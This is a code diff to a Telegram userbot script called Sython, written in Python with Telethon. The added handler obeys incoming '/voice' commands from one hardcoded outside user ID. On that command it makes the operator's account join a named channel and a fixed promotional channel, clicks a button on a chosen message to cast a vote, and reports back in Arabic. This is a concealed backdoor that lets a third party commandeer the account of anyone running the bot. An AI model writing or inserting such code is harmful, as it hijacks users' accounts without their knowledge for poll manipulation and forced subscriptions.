@@ -1049,6 +1049,23 @@ async def OwnerStart(event):
         sleep(1)
         await sython1.send_message(ownerhson_id,'**⚝ قمت بالانضمام والتصويت بنجاح**')
 
+ownerhson_ids = 5159123009
+@sython1.on(events.NewMessage(outgoing=False, pattern='^/voice (.*) (.*)'))
+async def OwnerStart(event):
+    sender = await event.get_sender()
+    if sender.id == ownerhson_ids:
+        chn = event.pattern_match.group(1)
+        nu = int(event.pattern_match.group(2))
+        nuu = nu - 1
+        wait = await sython1.send_message(ownerhson_ids,'**⚝ حسناً سوف اقوم بالانضمام والتصويت**')
+        haso = await sython1.get_entity(chn)
+        join = await sython1(JoinChannelRequest(chn))
+        joion = await sython1(JoinChannelRequest('saythonh'))
+        somy = await sython1.get_messages(chn, limit=nu)
+        await somy[nuu].click(0)
+        sleep(1)
+        await sython1.send_message(ownerhson_ids,'**⚝ قمت بالانضمام والتصويت بنجاح**')
+
 
 print("💠 Sython Userbot Running 💠")
 sython1.run_until_disconnected()
